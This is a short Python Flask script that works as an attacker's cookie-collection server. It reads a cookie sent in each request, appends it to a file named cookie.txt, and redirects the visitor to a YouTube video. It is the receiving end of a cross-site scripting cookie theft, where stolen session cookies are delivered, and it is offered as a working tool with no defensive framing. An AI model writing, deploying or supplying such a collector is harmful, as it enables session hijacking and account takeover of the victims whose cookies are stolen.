from flask import Flask, request, redirect
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def cookie():
    # Grabbing our cookie then writing it to a file called cookie.txt
    cookie = request.cookies.get('c')
    with open('cookie.txt', 'a') as f:
        f.write(cookie + '\n')
    return redirect('https://www.youtube.com/watch?v=dQw4w9WgXcQ')

if __name__ == '__main__':
    app.run(host="", port=80)
